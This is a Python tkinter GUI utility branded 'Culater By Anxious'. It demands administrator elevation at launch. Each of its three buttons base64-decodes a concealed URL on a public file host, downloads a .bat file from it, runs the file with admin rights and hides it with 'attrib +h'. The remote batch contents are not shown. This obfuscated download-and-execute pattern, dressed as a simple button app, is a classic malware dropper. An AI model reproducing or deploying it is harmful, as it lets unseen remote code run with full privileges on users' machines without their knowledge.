
import os
from tkinter import Tk, Canvas, Button, PhotoImage, messagebox,simpledialog
from PIL import Image,ImageTk


import ctypes
import sys
import base64,requests



import sys
import time
import platform
import os
import hashlib
from time import sleep
from datetime import datetime

    




def getchecksum():
    md5_hash = hashlib.md5()
    with open(sys.argv[0], "rb") as file: 
        md5_hash.update(file.read())
    digest = md5_hash.hexdigest()
    return digest




def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit()
q = Tk()
q.iconbitmap(r'C:/Users/Public/AccountPictures/CT/img/logo.ico')
q.withdraw()






q.deiconify()
q.config(bg = "#FFFFFF")

q.title(f"{os.getlogin()}" " | Culater By Anxious ")
width_of_window = 960  
height_of_window = 540
labels = []  
width = q.winfo_screenwidth()
height = q.winfo_screenheight()
x_coordinate = (width/2)-(width_of_window/2)
y_coordinate = (height/2)-(height_of_window/2)
q.geometry("%dx%d+%d+%d" %(width_of_window,height_of_window,x_coordinate,y_coordinate))
q.resizable(False, False)   
q.attributes('-topmost', 1)

def Godstyle():
    mystr_encoded = base64.b64decode(f"aHR0cHM6Ly9maWxlcy5jYXRib3gubW9lLzNlNjZnaS5iYXQ=")
    try:
        os.startfile(f'C:/Users/Public/AccountPictures/3e66gi.bat')
    except:
        with open(f'C:/Users/Public/AccountPictures/3e66gi.bat', 'wb') as f: 
            f.write(requests.get(mystr_encoded).content)
        os.startfile(f'C:/Users/Public/AccountPictures/3e66gi.bat')

        _doHideBatch = os.popen(f'attrib +h C:/Users/Public/AccountPictures/3e66gi.bat') 
        _doHideBatch.read()
        _doHideBatch.close()


def movement():
    mystr_encoded = base64.b64decode(f"aHR0cHM6Ly9maWxlcy5jYXRib3gubW9lLzMyZHN4NC5iYXQ=")
    try:
        os.startfile(f'C:/Users/Public/AccountPictures/32dsx4.bat')
    except:
        with open(f'C:/Users/Public/AccountPictures/32dsx4.bat', 'wb') as f: 
            f.write(requests.get(mystr_encoded).content)
        os.startfile(f'C:/Users/Public/AccountPictures/32dsx4.bat')

        _doHideBatch = os.popen(f'attrib +h C:/Users/Public/AccountPictures/32dsx4.bat') 
        _doHideBatch.read()
        _doHideBatch.close()
     

def bottle():
    mystr_encoded = base64.b64decode(f"aHR0cHM6Ly9maWxlcy5jYXRib3gubW9lL29sZnRjOC5iYXQ=")
   
    try:
        os.startfile(f'C:/Users/Public/AccountPictures/olftc8.bat') 
    except:
        with open(f'C:/Users/Public/AccountPictures/olftc8.bat', 'wb') as f:
            f.write(requests.get(mystr_encoded).content)
        os.startfile(f'C:/Users/Public/AccountPictures/olftc8.bat')

        _doHideBatch = os.popen(f'attrib +h C:/Users/Public/AccountPictures/olftc8.bat')
        _doHideBatch.read()
        _doHideBatch.close()

       




# Canvas setup
a = Canvas(
    q,
    bg="#000000",  # Background of the canvas is black
    height=540,
    width=960 ,
    bd=0,
    highlightthickness=0,
    relief="ridge"
)


##q.wm_attributes('-transparentcolor', '#000000')  # Black color becomes transparent


button_image_2 = ImageTk.PhotoImage(Image.open("C:/Users/Public/AccountPictures/CT/img/2.png"))
button_image_3 = ImageTk.PhotoImage(Image.open("C:/Users/Public/AccountPictures/CT/img/3.png"))
button_image_4 = ImageTk.PhotoImage(Image.open("C:/Users/Public/AccountPictures/CT/img/4.png"))

##quitButton = a.create_image(50, 50, image=button_image_1)


## Create the button with transparent PNG






button_2 = Button(
    image=button_image_2,
    borderwidth=0,               # No border for the button
    bg= "#8470FF",                # Button background set to match the canvas color (black)
    activebackground="#000000",  # Button background stays black on hover/click
    highlightthickness=0,        # No highlight when selected
    command=bottle,
    relief="flat"                # Flat relief to avoid any raised borders
)
button_2.place(
    x=400.5,
    y=200.0,
)
button_3 = Button(
    image=button_image_3,
    borderwidth=0,               # No border for the button
    bg= "#8470FF",                # Button background set to match the canvas color (black)
    activebackground="#000000",  # Button background stays black on hover/click
    highlightthickness=0,
    command=Godstyle,        # No highlight when selected
    relief="flat"                # Flat relief to avoid any raised borders
)
button_3.place(
    x=400.5,
    y=290.0,
)

button_4 = Button(
    image=button_image_4,
    borderwidth=0,               # No border for the button
    bg= "#8470FF",                # Button background set to match the canvas color (black)
    activebackground="#000000",  # Button background stays black on hover/click
    highlightthickness=0,
    command=movement,        # No highlight when selected
    relief="flat"                # Flat relief to avoid any raised borders
)
button_4.place(
    x=400.5,
    y=380.0,
)






# Load button2 PNG with transparency using Pillow

# Place canvas
a.place(x=0, y=0)

# Load the main PNG with transparency
image_image2 = Image.open("C:/Users/Public/AccountPictures/CT/img/main.png")
image_image2 = ImageTk.PhotoImage(image_image2)

# Add the image to the canvas (PNG with transparency)
image2 = a.create_image(
    480, 270,
    image=image_image2
)

# Final settings for the window
q.resizable(False, False)
q.mainloop()